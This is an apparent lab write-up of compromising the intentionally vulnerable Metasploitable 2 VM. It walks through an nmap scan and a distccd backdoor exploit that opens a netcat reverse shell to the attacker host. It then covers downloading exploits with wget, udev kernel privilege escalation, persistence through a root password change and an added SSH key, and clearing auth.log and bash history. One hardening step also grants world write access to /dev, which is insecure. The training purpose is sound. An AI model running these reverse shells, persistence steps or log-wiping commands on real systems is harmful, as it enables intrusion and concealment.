# Metasploitable 2

This document shows an hacking approach for Metasploitable 2, involving multiple phases such as reconnaissance, manual exploitation, privilege escalation, and post-exploitation.

## 1. Reconnaissance (Information Gathering)

### Active and Passive Scanning:

Use `nmap` to identify open ports, services, and OS details.

```bash
nmap -A -sV <target IP>
```

### Service Enumeration:

#### Port Scan Results

| Port     | State | Service     | Version                                             |
| -------- | ----- | ----------- | --------------------------------------------------- |
| 21/tcp   | open  | ftp         | vsftpd 2.3.4                                        |
| 22/tcp   | open  | ssh         | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)        |
| 23/tcp   | open  | telnet      | Linux telnetd                                       |
| 25/tcp   | open  | smtp        | Postfix smtpd                                       |
| 53/tcp   | open  | domain      | ISC BIND 9.4.2                                      |
| 80/tcp   | open  | http        | Apache httpd 2.2.8 ((Ubuntu) DAV/2)                 |
| 111/tcp  | open  | rpcbind     | 2 (RPC #100000)                                     |
| 139/tcp  | open  | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)         |
| 445/tcp  | open  | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)         |
| 512/tcp  | open  | exec        | netkit-rsh rexecd                                   |
| 513/tcp  | open  | login       |                                                     |
| 514/tcp  | open  | shell       | Netkit rshd                                         |
| 1099/tcp | open  | java-rmi    | GNU Classpath grmiregistry                          |
| 1524/tcp | open  | bindshell   | Metasploitable root shell                           |
| 2049/tcp | open  | nfs         | 2-4 (RPC #100003)                                   |
| 2121/tcp | open  | ftp         | ProFTPD 1.3.1                                       |
| 3306/tcp | open  | mysql       | MySQL 5.0.51a-3ubuntu5                              |
| 3632/tcp | open  | distccd     | distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))    |
| 5432/tcp | open  | postgresql  | PostgreSQL DB 8.3.0 - 8.3.7                         |
| 5900/tcp | open  | vnc         | VNC (protocol 3.3)                                  |
| 6000/tcp | open  | X11         | (access denied)                                     |
| 6667/tcp | open  | irc         | UnrealIRCd (Admin email admin@Metasploitable.LAN)   |
| 6697/tcp | open  | irc         | UnrealIRCd (Admin email admin@Metasploitable.LAN)   |
| 8009/tcp | open  | ajp13       | Apache Jserv (Protocol v1.3)                        |
| 8180/tcp | open  | http        | Apache Tomcat/Coyote JSP engine 1.1                 |
| 8787/tcp | open  | drb         | Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb) |

#### Service Info:

- **Host**: metasploitable.localdomain
- **OSs**: Unix, Linux

## 2. Vulnerability Assessment

For an exploit we used different sources in the internet.

For this example I attached the exploit in the exploit directory.

Normally you can search through the hacking db or similar like

- https://www.exploit-db.com/
- https://www.exploit-db.com/google-hacking-database/

## 3. Exploitation (Manual and Customized)

### distccd CVE-2004-2687 Backdoor Exploit:

As a listener we use NetCat

```bash
nc -vnlp 4444
```

As the listener is active we execute the exploit and open the reverse shell.

Now we got 2 ways to exploit the Vulnerability, either with a python exploit or with a metasploit exploit.
Both exploits are downloadable in the exploits folder in this repository

```bash
python2 distccd.py -t 192.168.56.101 -c "nc 192.168.56.1 4444 -e /bin/sh"
```

now where we opened the listener we can send shell commands. with this command we change the shell to a bash shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

## 4. Privilege Escalation

Once a low-privilege shell is obtained, we escalate privileges.

we do that with a kernel exploit. so we first check the release and kernel version with

```bash
uname -a
lsb_release -a
```

Here we see that the target has kernel 2.6.24 and is running Ubuntu 8.04

With the metasploit framework we can search through exploits and filter to our requirement.

```bash
searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
```

But for now we use the attached exploit in this repo in exploits direcory.

With a python http server we share the 2 exploits and download them from the server

```bash
python3 -m http.server 8888
```

and on the metasploitable we use

```bash
wget http://{Kali IP address}:8888/exploitname
```

Command to check udevd process:

```bash
ps aux | grep udev
```

```bash
root      503  0.0  0.0 {30084}  7536 ? Ss   07:54 0:00 /usr/lib/systemd/systemd-udevd
dominik 17354  0.0  0.0  6932 2160 pts/4 S+ 11:16 0:00 grep udev
```

What we are searching now is this PID in Braces. there should be in the output of the next command a PID which is 1 smaller than this one.

```bash
cat /proc/net/netlink
```

And the output will look something like this

| sk               | Eth | Pid   | Groups   | Rmem | Wmem | Dump | Locks | Drops | Inode |
| ---------------- | --- | ----- | -------- | ---- | ---- | ---- | ----- | ----- | ----- |
| 00000000f5f1e2d9 | 0   | 30083 | 00000113 | 0    | 0    | 0    | 2     | 0     | 73184 |
| 00000000057eaf68 | 0   | 0     | 00000000 | 0    | 0    | 0    | 2     | 0     | 13    |
| 000000002073828a | 0   | 0     | 00000440 | 0    | 0    | 0    | 2     | 0     | 21150 |

So we got the PID which whould be 30083 one smaller than the PID from ps -aux | grep udev

### Compiling and Executing the .c Exploit

After identifying the correct PID for privilege escalation, the next step is to compile and execute a `.c` exploit on the target system. This exploit file, available in the `exploits` directory, needs to be transferred to the Metasploitable 2 instance (target system). First, make sure that you have a listener set up on your Kali Linux machine (for example, with Netcat on port 4444), which will catch the reverse shell initiated by the exploit.

Steps to compile and execute the `.c` exploit:

```bash
# 1. Compile the exploit
gcc -o exploit privilege_escalation.c

# 2. Rename the reverse_shell.sh to run
mv nc_rev.sh run

# 2. Execute the compiled exploit
./exploit {PID != 0}
```

With the listener active on your Kali machine, the exploit should connect back to it, granting you shell access with escalated privileges.

### SSH Access:

After successfully escalating privileges to root, you can set up persistent SSH access to the system:

```bash
# 1. Change the root password
passwd
```

Follow the prompt to enter and confirm the new password.

```bash
# 2. Add your SSH public key
# First, on your Kali machine, generate an SSH key pair if you haven’t already:
ssh-keygen -t rsa -b 4096
```

Copy the content of the generated public key (~/.ssh/id_rsa.pub) and paste it into the root/.ssh/authorized_keys file on the Metasploitable machine:

```bash
echo "<your-public-key>" >> /root/.ssh/authorized_keys
```

## 6. Post-Exploitation - Good Path

After obtaining root access, securing the target system is critical to prevent others from exploiting the same vulnerabilities.

### Secure the system:

```bash
# 1. Remove DistCCD from the server
update-rc.d -f distccd remove

# 2. Configure the Firewall for distccd
iptables -A INPUT -p tcp --dport 3632 -j DROP

# 3. Set proper permissions for sensitive directories

# Restrict access to /sbin to root only
chmod 700 /sbin

# Allow write access to /dev for others (use cautiously)
chmod o+w /dev

# 3. Install Network Intrusion Detection System (NIDS)
# Install Snort to monitor network traffic for suspicious activity
sudo apt install snort -y
```

## 7. Covering Tracks - Bad Path

Securely delete sensitive files and logs to remove traces of the attack.

### Clear Logs:

- `/var/log/auth.log`
- `.bash_history`

Use `shred` or `dd` to securely delete files.
